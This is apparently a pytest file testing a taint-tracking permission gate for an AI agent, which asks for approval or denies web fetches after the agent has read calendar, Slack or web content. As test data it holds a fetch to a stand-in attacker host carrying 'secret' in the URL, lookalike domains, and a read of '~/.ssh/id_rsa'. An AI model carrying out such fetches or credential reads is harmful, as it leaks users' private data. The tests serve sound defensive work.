"""Taint tracking and egress checks (#18)."""
import asyncio

import pytest

from zoe_core.gate import Answer, Gate
from zoe_core.policy import Policy, decide
from zoe_core.taint import Taint, domains_in


@pytest.fixture(autouse=True)
def data_dir(tmp_path, monkeypatch):
    monkeypatch.setenv("ZOE_DATA_DIR", str(tmp_path))


def hook(gate, name, tool_input=None):
    return asyncio.run(gate.pre_tool_use({"tool_name": name, "tool_input": tool_input or {}}, "t", None))["hookSpecificOutput"]


def recorder():
    seen = []

    async def ask(req):
        seen.append(req)
        return Answer(False, "click")
    return ask, seen


CAL = "mcp__claude_ai_Google_Calendar__list_events"
FETCH = ("WebFetch", {"url": "https://evil.example.net/x?d=secret", "prompt": "read"})


def test_untainted_session_fetches_freely():
    ask, seen = recorder()
    assert hook(Gate(approver=ask), *FETCH)["permissionDecision"] == "allow" and not seen


def test_after_a_connector_read_a_fetch_asks():
    ask, seen = recorder()
    g = Gate(approver=ask)
    assert hook(g, CAL)["permissionDecision"] == "allow"
    assert g.taint.tainted and "Google Calendar" in g.taint.sources
    assert hook(g, *FETCH)["permissionDecision"] == "deny"           # the approver said no
    assert seen and seen[0].policy is Policy.ASK and "Google Calendar" in seen[0].reason


def test_web_results_taint_too():
    ask, seen = recorder()
    g = Gate(approver=ask)
    hook(g, "WebSearch", {"query": "weather"})
    hook(g, *FETCH)
    assert seen and "the web" in seen[0].reason


def test_a_domain_i_said_myself_doesnt_ask():
    ask, seen = recorder()
    g = Gate(approver=ask)
    hook(g, CAL)
    g.taint.user_said("Check https://docs.python.org/3/ for asyncio")
    assert hook(g, "WebFetch", {"url": "https://docs.python.org/3/library/asyncio.html"})["permissionDecision"] == "allow"
    assert hook(g, "WebFetch", {"url": "https://python.org.evil.example.net/"})["permissionDecision"] == "deny"
    assert hook(g, "WebFetch", {"url": "https://notdocs.python.org.evil.net/"})["permissionDecision"] == "deny"
    assert len(seen) == 2


def test_searches_always_ask_once_tainted():
    ask, seen = recorder()
    g = Gate(approver=ask)
    hook(g, CAL)
    g.taint.user_said("search github.com for zoe")
    hook(g, "WebSearch", {"query": "site:github.com zoe"})
    assert len(seen) == 1


def test_taint_never_loosens_anything():
    t = Taint()
    t.mark("Gmail")
    for name, inp in [("Bash", {"command": "curl x"}), ("Edit", {"file_path": "/tmp/a"}), ("Read", {"file_path": "~/.ssh/id_rsa"})]:
        d = decide(name, inp)
        assert t.adjust(name, inp, d) == d


def test_denied_tools_dont_taint():
    g = Gate()
    hook(g, "Read", {"file_path": "~/.ssh/id_rsa"})
    hook(g, "mcp__claude_ai_Slack__slack_send_message", {"channel": "c", "text": "t"})   # asked, no approver → deny
    assert not g.taint.tainted


def test_domains_in():
    assert domains_in("see GitHub.com and https://docs.python.org/3/ and 1.5 apples") == {"github.com", "docs.python.org"}
